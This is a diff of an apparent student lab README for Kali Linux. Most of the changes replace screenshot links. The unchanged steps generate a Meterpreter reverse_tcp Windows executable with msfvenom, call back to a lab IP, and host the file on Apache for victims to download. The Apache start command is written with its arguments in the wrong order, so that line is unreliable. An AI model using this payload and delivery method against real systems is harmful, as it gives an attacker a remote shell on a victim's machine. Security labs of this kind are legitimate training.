@@ -25,32 +25,34 @@ Open terminal and try execute some kali linux commands
 
 Find the attackers ip address using ifconfig
 ## OUTPUT:
-![Screenshot 2024-10-28 134355](https://github.com/user-attachments/assets/1bbf8c37-7315-4da6-8796-8abb08efe9aa)
+![02 kali](https://github.com/user-attachments/assets/1f769597-d562-47f7-b913-49780739c387)
+
 
 
 
 Create a malicious executable file fun.exe using msenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT
-![image](https://github.com/user-attachments/assets/692e185d-e439-4801-b19c-d0a14fdcea11)
+![Screenshot 2024-10-28 165041](https://github.com/user-attachments/assets/6e6ce175-d228-4296-9187-2243d95740fe)
+
 
 
 
 
 copy the fun.exe into the apache /var/www/html folder
 
-![image](https://github.com/user-attachments/assets/ab1e8fb3-92e1-4c52-8ab4-7c8c88323fd4)
+![Screenshot 2024-10-28 165210](https://github.com/user-attachments/assets/f51a77f8-f404-4516-9f51-3a7af60d80c3)
+
 
 
 Start apache server
 sudo systemctl apache2 start
 
-![image](https://github.com/user-attachments/assets/67eeb4b9-f92e-4900-ba3a-b983e1e2af82)
+![Screenshot 2024-10-28 165252](https://github.com/user-attachments/assets/846e8a42-b95d-4a8c-914d-f3f8c8ad49d1)
 
 
 Check the status of apache2
-
-![image](https://github.com/user-attachments/assets/5c30a2b4-5ecd-4002-9494-2615a6b3496a)
+![Screenshot 2024-10-28 165332](https://github.com/user-attachments/assets/b954f796-eac3-4f1e-8771-deee7c8cb678)
 
 
 Invoke msfconsole:
